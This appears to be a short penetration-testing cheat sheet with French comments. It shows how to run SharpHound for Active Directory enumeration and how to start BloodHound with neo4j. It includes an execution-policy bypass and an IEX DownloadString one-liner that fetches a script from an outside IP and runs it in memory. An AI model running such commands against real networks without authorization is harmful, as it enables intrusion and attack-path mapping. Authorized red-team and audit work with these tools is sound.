### Sharphound

```powershell
Powershell.exe -Exec Bypass
Import-Module .\Sharphound.ps1
Invoke-Bloodhound
Invoke-BloodHound -CollectionMethod All

powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://192.168.119.216/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All"

```


### Setup Bloodhound
```bash
# Bloodhound directement depuis la machine cible
# apt-get install bloodhound

# Setup
$ sudo neo4j console
...
... http://localhost:7474
user/pass = neo4j/neo4j

# Start
$ bloodhound
URL : bolt://127.0.0.1:7687
```